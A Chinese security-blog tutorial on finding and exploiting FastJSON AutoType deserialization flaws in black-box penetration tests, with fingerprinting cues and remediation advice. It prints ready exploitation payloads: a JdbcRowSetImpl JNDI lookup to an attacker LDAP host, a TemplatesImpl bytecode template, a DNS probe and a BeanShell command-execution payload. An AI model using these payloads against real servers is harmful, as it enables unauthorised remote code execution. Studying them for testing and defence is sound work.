#  渗透测试实战：FastJSON漏洞如何在黑盒场景中精准触发？   
原创 火力猫  季升安全   2025-04-24 00:15  
  
# 🧨 FastJSON 渗透实战指南  
## 1️⃣ 什么是 FastJSON？  
  
FastJSON 是阿里巴巴开源的一款高性能 Java JSON 解析库，用于将 JSON 字符串转换为 Java 对象，或将 Java 对象序列化为 JSON。  
  
👉 **开发者最常用的方法**  
：  
```
Object obj = JSON.parse(json); // 动态解析，关键点！
```  
  
**JSON.parse的安全隐患分析详情**  
👉 [一文看懂 JSON.parse 背后的安全隐患与黑盒利用方法](https://mp.weixin.qq.com/s?__biz=MzkxNjY5MDc4Ng==&mid=2247484854&idx=1&sn=f92252c15004768d1f8911ce80e3de7e&scene=21#wechat_redirect)  
  
## 2️⃣ FastJSON 漏洞产生原因  
### 🚨 问题核心：AutoType 自动类型识别  
  
当传入如下 JSON：  
```
{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://attacker.com:1389/Exploit","autoCommit": true}
```  
  
若 **AutoType 功能未禁用**  
，FastJSON 会尝试加载并实例化你指定的类。攻击者可以构造恶意类，实现远程代码执行（RCE）！  
  
**🧯 正常业务场景根本不需要 @type，但若未做限制，就容易被利用。**  
## 3️⃣ 怎么发现可利用点呢？  
### 观察报错信息：  
  
<table><thead><tr style="box-sizing: border-box;"><th style="box-sizing: border-box;"><span cid="n8" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">关键词</span></span></span></th><th style="box-sizing: border-box;"><span cid="n9" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">意义</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n11" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">com.alibaba.fastjson</span></code></span></span></td><td style="box-sizing: border-box;"><span cid="n12" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">FastJSON 类路径</span></span></span></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n14" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">com.alibaba.fastjson.JSONException</span></code></span></span></td><td style="box-sizing: border-box;"><span cid="n15" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">JSON 解析异常</span></span></span></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n17" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">AutoType is not support</span></code></span></span></td><td style="box-sizing: border-box;"><span cid="n18" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">禁用 AutoType 提示</span></span></span></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n20" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">Could not auto-type class</span></code></span></span></td><td style="box-sizing: border-box;"><span cid="n21" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">尝试加载类失败，典型 FastJSON 错误</span></span></span></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n23" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">parseObject / parseArray</span></code></span></span></td><td style="box-sizing: border-box;"><span cid="n24" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">方法堆栈中可能出现</span></span></span></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n26" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">ClassNotFoundException</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> + </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;"><span leaf="">@type</span></code></span></span></td><td style="box-sizing: border-box;"><span cid="n27" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">尝试加载不存在类（典型探测响应）</span></span></span></td></tr></tbody></table>  
报错信息示例：  
```
{"error": {"message": "Could not auto-type class","type": "com.alibaba.fastjson.JSONException"  }}
```  
### ✅ API 特征分析：  
#### 1. 参数中出现原始 JSON 字符串字段  
```
{"payload": "{\"a\":1,\"b\":2}"// 👈 明显是服务端要 parse 的}
```  
  
🔍 **说明**  
：开发者常将嵌套 JSON 作为字符串参数传给后端，然后用 JSON.parse(payload)  
 解析。  
#### 2. 接口直接接收 JSON 并返回原样结构  
```
POST /api/echoContent-Type: application/json{"name": "Alice","age": 23}
```  
  
响应：  
```
{"code": 0,"data": {"name": "Alice","age": 23  }}
```  
  
🎯 分析：接口对原始 JSON 做了结构化处理再输出，可能使用了 parseObject()  
。  
#### 3. 接口响应字段中回显了传入的结构（比如 @type）  
  
输入：  
```
{ "@type":"www.geekserver.top" }
```  
  
响应回显：  
```
{ "@type": "www.geekserver.top" }
```  
  
🔍 说明服务端未做结构过滤，可能直接使用了 JSONObject  
 存储处理用户输入。  
  
👉**当参数字段名中出现data、config、json、payload 就应该引起注意**  
### ✅ 响应行为分析：  
- 请求中加入 @type  
 字段后，如果有下面特征，就需要进一步分析：  
  
- 直接回显  
  
- 报错有类名或堆栈信息  
  
- 响应时间明显变慢（sleep 链）  
  
- DNS 有请求（URL/DNS 测试）  
  
## 4️⃣ 漏洞利用方式  
### 📍 利用方式一：JNDI 回连  
```
{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://attacker.com:1389/Exploit","autoCommit": true}
```  
- ✅ 原理：  
  
- setDataSourceName()  
 内部会调用 connect()  
  
- 在 autoCommit=true  
 时触发 JNDI 查询 → 远程类加载 → RCE  
  
- 🎯关注点：  
  
- 确认 autoCommit  
 字段被调用  
  
- 确认LDAP 服务端返回恶意 class  
  
- 🔥 结果：RCE 或 LDAP 服务器收到回连  
  
### 📍 利用方式二：TemplatesImpl RCE  
```
{"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","transletBytecodes": ["<恶意字节码 base64>"],"transletName": "a","outputProperties": {}}
```  
- ✅ 原理：类加载器会执行字节码静态块，具体：  
  
- newTemplates()  
 时会加载并实例化 bytecode 中的类  
  
- bytecode 中可植入静态块执行任意命令  
  
- 🔥 结果：直接 RCE  
  
### 📍 利用方式三：DNS 盲注  
```
{"@type": "java.net.InetAddress","val": "www.geekserver.top"}
```  
- ✅ 原理：FastJSON 反序列化InetAddress.getByName()  
 触发 DNS 请求  
  
- 🔥 结果：在无回显环境中判断漏洞存在  
  
FastJSON无回显探测   
👉 [DNS 一响，漏洞登场！FastJSON 不出网探测全攻略](https://mp.weixin.qq.com/s?__biz=MzkxNjY5MDc4Ng==&mid=2247484869&idx=1&sn=88c819aa551068b45e14ae20ae239e21&scene=21#wechat_redirect)  
  
  
### 📍 利用方式四：BeanShell 执行脚本  
```
{"@type":"bsh.BeanShell","name": "geekserver.top","eval": "java.lang.Runtime.getRuntime().exec('id').toString()"}
```  
- ✅ 前提：服务端有 BeanShell  
  
- 🔍 原理：bsh.BeanShell  
 在 eval()  
 时直接执行脚本  
  
- 🔥 结果：直接命令执行（某些旧系统）  
  
## 5️⃣ 总结  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">步骤</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">操作</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">工具</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">🎯 收集</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Burp 抓包，分析响应结构、错误信息</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Burp Suite</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">🔍 探测</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">插入 </span><code><span leaf="">{&#34;@type&#34;:&#34;xxx&#34;}</span></code><span leaf=""> 逐步 fuzz</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Burp Intruder</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">📡 验证</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">DNS、回连、延迟判断</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">DNSLog、JNDI 工具</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">💥 利用</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">发送 Payload，触发命令执行</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">LDAP 服务器、Metasploit</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">🧪 取证</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">回连日志、系统变更、回显信息</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Burp Logger、日志分析</span></section></td></tr></tbody></table>  
## 🛡️ 修复建议：  
- 关闭 AutoType：ParserConfig.getGlobalInstance().setAutoTypeSupport(false);  
  
- 若必须开启，严格配置白名单：addAccept("com.safe.package.")  
  
- 不使用 JSON.parse()  
，应指定明确类  
  
  
  
  
  
